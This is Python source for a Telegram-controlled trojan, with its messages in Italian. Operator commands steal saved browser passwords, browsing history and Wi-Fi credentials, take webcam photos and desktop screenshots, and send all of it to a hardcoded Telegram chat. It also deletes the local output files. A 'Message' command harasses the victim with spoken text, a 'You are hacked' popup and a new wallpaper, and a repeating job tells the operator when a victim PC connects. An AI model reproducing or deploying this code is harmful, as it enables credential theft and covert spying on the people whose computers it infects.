from lib.config import *
from telegram.ext import Updater, CommandHandler
from telegram.ext import MessageHandler, Filters
import telegram.ext
import time
import emoji
import pyscreenshot as ImageGrab

updater = Updater(TOKEN, use_context=True)
j = updater.job_queue
uu=updater.job_queue

def history(update, context):
	global disk_label
	avvio = f"{disk_label}{main_name_dir}\python\python.exe {disk_label}{main_name_dir}\\Tools\\Stealer\\Chromium\\History.py"
	os.system(avvio)
	emoction=emoji.emojize(":scroll:")
	context.bot.send_message(chat_id=update.effective_chat.id, text= f"Invio history in corso... {emoction}")
	try:
		context.bot.send_document(chat_id=update.effective_chat.id,document=open(f'{disk_label}{main_name_dir}\output_file_history.txt', 'rb'))
		os.remove(f'{disk_label}{main_name_dir}\output_file_history.txt')
	except FileNotFoundError:
		try:
			context.bot.send_document(chat_id=update.effective_chat.id,document=open(f'{disk_label}{main_name_dir}\python\output_file_history.txt', 'rb'))
			os.remove(f'{disk_label}{main_name_dir}\python\output_file_history.txt')
		except FileNotFoundError:
			context.bot.send_message(chat_id=update.effective_chat.id, text=f"Mi dispiace ma non sono salvate le history del browser su questo pc")


def password(update, context):
	global disk_label
	avvio = f"{disk_label}{main_name_dir}\python\python.exe {disk_label}{main_name_dir}\\Tools\\Stealer\\Chromium\\Passwords.py"
	os.system(avvio)
	emoction=emoji.emojize(":file_folder:")
	context.bot.send_message(chat_id=update.effective_chat.id, text=f"Invio password in corso... {emoction}")
	try:
		context.bot.send_document(chat_id=update.effective_chat.id,document=open(f'{disk_label}{main_name_dir}\output_file_password.txt', 'rb'))
		os.remove(f'{disk_label}{main_name_dir}\output_file_password.txt')
	except FileNotFoundError:
		try:
			context.bot.send_document(chat_id=update.effective_chat.id,document=open(f'{disk_label}{main_name_dir}\python\output_file_password.txt', 'rb'))
			os.remove(f'{disk_label}{main_name_dir}\python\output_file_password.txt')
		except FileNotFoundError:
			context.bot.send_message(chat_id=update.effective_chat.id, text=f"Mi dispiace ma non sono salvate password su questo pc")


def messaggio(update, context):
	testo=context.args[0:]
	testo=" ".join(testo)
	testo=str(testo)
	import pyttsx3
	import pythoncom
	from tkinter import messagebox 
	pythoncom.CoInitialize()
	engine = pyttsx3.init()
	rate = engine.getProperty('rate')   # getting details of current speaking rate                
	engine.setProperty('rate', 125)     # setting up new voice rate
	engine.say(testo)
	engine.runAndWait()
	messagebox.showerror("You are hacked...", testo) 
	emoction999= emoji.emojize(":grinning_face:")
	global disk_label
	image=f"{disk_label}{main_name_dir}\\Tools\\hacker.png"
	_SPI_SETDESKWALLPAPER = 20 
	if not os.path.exists(image):
		raise FileNotFoundError(f"Image {repr(image)} not exists")
	windll.user32.SystemParametersInfoW(_SPI_SETDESKWALLPAPER, 0, image, 3)
	context.bot.send_message(chat_id=update.effective_chat.id, text=f"Sfondo Desktop cambiato {emoction999}")


def unknown(update, context):
    context.bot.send_message(chat_id=update.effective_chat.id, text="Scusa non ho compreso bene il comando!!")


def help(update,context):
	emoction00=emoji.emojize(":smiling_face_with_sunglasses:")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f" {emoction00} Tipi di attacchi :  {emoction00} ")
	emoction0=emoji.emojize(":file_folder:")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f"/LocalPassword {emoction0} : Ottenere un file con le password")
	emoction2=emoji.emojize(":scroll:")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f"/History {emoction2} : Ottenere la history")
	#emoction3= emoji.emojize(":cookie:")
	#context.bot.sendMessage(chat_id=update.effective_chat.id,text=f"/get_cookie {emoction3} : Ottenere i cookies")
	#emoction5= emoji.emojize(":credit_card:")
	#context.bot.sendMessage(chat_id=update.effective_chat.id,text=f"/get_credit_cards {emoction5} : Ottenere le carte di credito")
	emoction4= emoji.emojize(":level_slider:")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f"/Wifi : Ottenere il wifi")
	emoction8= emoji.emojize(":keyboard:")
	#context.bot.sendMessage(chat_id=update.effective_chat.id,text=f"/power (s,r,l,h)-->(/Shutdown/Reboot/LogOff/Hibernate {emoction4} : Spegnere riavviare ibernare o disconnettere il pc")
	emoction9= emoji.emojize(":camera:")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f"/Screen  : Ottieni lo screenshot del desktop della vittima")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f"/Webcam {emoction9}: Ottieni la foto dell'utente")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f"/Message [testo] : Cambi sfondo desktop alla vittima e invii un vocale")
	emoction99=emoji.emojize(":smiling_face_with_sunglasses:")
	context.bot.sendMessage(chat_id=update.effective_chat.id,text=f"/help {emoction99}: Vi mostro i comandi che potete usare")


def wifi(update, context):
	global disk_label
	avvio = f"{disk_label}{main_name_dir}\python\python.exe {disk_label}{main_name_dir}\\Tools\\Stealer\\Wifi.py"
	os.system(avvio)
	emoction=emoji.emojize(":level_slider:")
	context.bot.send_message(chat_id=update.effective_chat.id, text=f"Invio informazioni sul wifi in corso... {emoction}")
	try:
		context.bot.send_document(chat_id=update.effective_chat.id,document=open(f'{disk_label}{main_name_dir}\python\output_file_wifi.txt', 'rb'))
		os.remove(f'{disk_label}{main_name_dir}\python\output_file_wifi.txt')
	except FileNotFoundError:
		try:
			context.bot.send_document(chat_id=update.effective_chat.id,document=open(f'{disk_label}{main_name_dir}\output_file_wifi.txt', 'rb'))
			os.remove(f'{disk_label}{main_name_dir}\output_file_wifi.txt')
		except FileNotFoundError:
			context.bot.send_message(chat_id=update.effective_chat.id, text=f"Mi dispiace ma non sono riuscito a recuperare le credenziali del wifi")



def webcam(update,context):
	global disk_label
	avvio = f"{disk_label}{main_name_dir}\python\python.exe {disk_label}{main_name_dir}\\Tools\\Spying\\Webcam.py"
	os.system(avvio)
	emoction9= emoji.emojize(":camera:")
	context.bot.send_message(chat_id=update.effective_chat.id, text=f"Acqusizione immagine dalla webcam in corso...{emoction9} ")
	try:
		context.bot.send_photo(chat_id=update.effective_chat.id,photo=open(f'{disk_label}{main_name_dir}\webcam.png', 'rb'))
		os.remove(f'{disk_label}{main_name_dir}webcam.png')
	except FileNotFoundError:
		context.bot.send_photo(chat_id=update.effective_chat.id,photo=open(f'{disk_label}{main_name_dir}\webcam.png', 'rb'))
		os.remove(f'{disk_label}{main_name_dir}\webcam.png')


def screenshot(update,context):
	global disk_label
	im = ImageGrab.grab()
	im.save("screenshot.png")
	emoction999= emoji.emojize(":camera_with_flash:")
	context.bot.send_message(chat_id=update.effective_chat.id, text=f"Acqusizione screenshot desktop in corso...{emoction999} ")
	try:
		context.bot.send_photo(chat_id=update.effective_chat.id,photo=open(f'{disk_label}{main_name_dir}\screenshot.png', 'rb'))
		os.remove(f'{disk_label}{main_name_dir}\screenshot.png')
	except FileNotFoundError:
		context.bot.send_photo(chat_id=update.effective_chat.id,photo=open(f'{disk_label}{main_name_dir}\python\screenshot.png', 'rb'))
		os.remove(f'{disk_label}{main_name_dir}\python\screenshot.png')

def callback_minute(context: telegram.ext.CallbackContext):
	emoction556=emoji.emojize(":sparkles:")
	context.bot.send_message(chat_id='502522267',text=f'{emoction556} Bot connesso al pc vittima')
	time.sleep(1)
	context.bot.send_message(chat_id='502522267',text=f'Ti lascio il comando /help per vedere tutte le funzioni che ho a disposizione')


def main():
	print("Sto ascoltando...")
	dp = updater.dispatcher
	dp.add_handler(CommandHandler('help', help))
	dp.add_handler(CommandHandler('LocalPassword',password))
	dp.add_handler(CommandHandler('Wifi',wifi))
	dp.add_handler(CommandHandler('History',history))
	dp.add_handler(CommandHandler('Screen',screenshot))
	dp.add_handler(CommandHandler('Webcam',webcam))
	dp.add_handler(CommandHandler('Message',messaggio,pass_args=True,pass_chat_data=True))
	job_minute = j.run_repeating(callback_minute, interval=10800, first=0)


	unknown_handler = MessageHandler(Filters.command, unknown)
	dp.add_handler(unknown_handler)
	updater.start_polling()
	updater.idle()



disk_label=processing()
main()

#if __name__ == '__main__':
#	disk_label=processing()
#	main()